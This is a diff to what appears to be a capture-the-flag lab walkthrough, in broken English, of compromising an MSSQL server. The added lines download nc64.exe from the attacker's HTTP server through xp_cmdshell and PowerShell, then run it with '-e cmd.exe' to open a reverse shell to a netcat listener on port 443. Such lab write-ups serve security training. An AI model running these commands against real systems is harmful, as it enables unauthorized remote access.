@@ -37,5 +37,9 @@ RECONFIGURE;
 ```
 8.  now we will use this file [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) , but first we need to run Power-Shell because it better than normal command prompt , to do this we will use this command `xp_cmdshell "powershell -c command"`  replace `commnad` with any command you want to perform , i use `pwd` to know where we are , and this is the output `C:\Windows\system32` but we cannot write here , so after some enumeration i know that download will be great 
 9. now we need to upload this  [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) file , and for that we will use this 
-   command `sudo python3 -m http.server 80` in our terminal , now in the server terminal do this command  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wgethttp://10.10.14.9/nc64.exe -outfile nc64.exe"` 
+   command `sudo python3 -m http.server 80` in our terminal , now in the server terminal do this command  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.58:80/nc64.exe -outfile nc64.exe"` 
+   by that we download this file to the server  and to make this file work we will use this command 
+   `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.58 443"` by this we make the file work and give it our ip and the port 
+   and you should run this on your terminal `nc -lnvp 443` 
+10. boom!!! we get reverse shell to the main server
 
